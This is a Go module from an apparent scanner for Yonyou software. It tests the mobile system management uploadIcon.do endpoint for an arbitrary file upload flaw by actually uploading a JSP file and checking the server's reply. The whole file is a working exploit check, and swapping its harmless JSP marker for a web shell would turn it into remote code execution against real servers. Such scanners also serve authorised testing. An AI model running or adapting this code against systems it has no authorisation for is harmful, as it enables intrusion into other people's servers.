package Scan

import (
	"fmt"
	"fupo_for_yonyou/Utils"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func MobileUploadIconScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	const MobileUploadIcon = "用友 移动系统管理 uploadIcon.do 任意文件上传漏洞"
	urls := address + "/maportal/appmanager/uploadIcon.do"

	// 发送 POST 请求
	response, err := client.Post(urls, "multipart/form-data; boundary=b4e8eb7e0392a9158c610b1875784406", strings.NewReader("--b4e8eb7e0392a9158c610b1875784406\nContent-Disposition: form-data; name=\"iconFile\"; filename=\"tteesstt.jsp\"\n\n<% out.println(\"tteesstt2\"); %>\n--b4e8eb7e0392a9158c610b1875784406--"))
	if err != nil {
		if strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") || strings.Contains(err.Error(), "forcibly closed") {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被目标服务器阻断\n", Cyan, currentTime, Reset, Yellow, Reset, MobileUploadIcon)
		} else {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被重置\n", Cyan, currentTime, Reset, Yellow, Reset, MobileUploadIcon)
		}
		return
	}
	defer response.Body.Close()

	// 读取响应内容
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] %s 读取响应内容失败: %v", Cyan, currentTime, Reset, Yellow, Reset, MobileUploadIcon, err)
		fmt.Println(output)
		return
	}

	// 检查漏洞是否存在
	if response.StatusCode == http.StatusOK && strings.Contains(string(body), "{\"status\":2}") {
		result := MobileUploadIcon + "：" + urls
		output := fmt.Sprintf("[%s%s%s] [%s+%s] 存在%s：%s", Cyan, currentTime, Reset, Green, Reset, MobileUploadIcon, urls)
		fmt.Println(output)

		// 保存结果到文件
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		if err := Utils.SaveResultToFile(result, filename); err != nil {
			output := fmt.Sprintf("[%s%s%s] [%s-%s] %s 保存结果到文件出错: %v", Cyan, currentTime, Reset, Yellow, Reset, MobileUploadIcon, err)
			fmt.Println(output)
		}
	} else {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] 不存在%s，状态码: %d", Cyan, currentTime, Reset, Yellow, Reset, MobileUploadIcon, response.StatusCode)
		fmt.Println(output)
	}
}
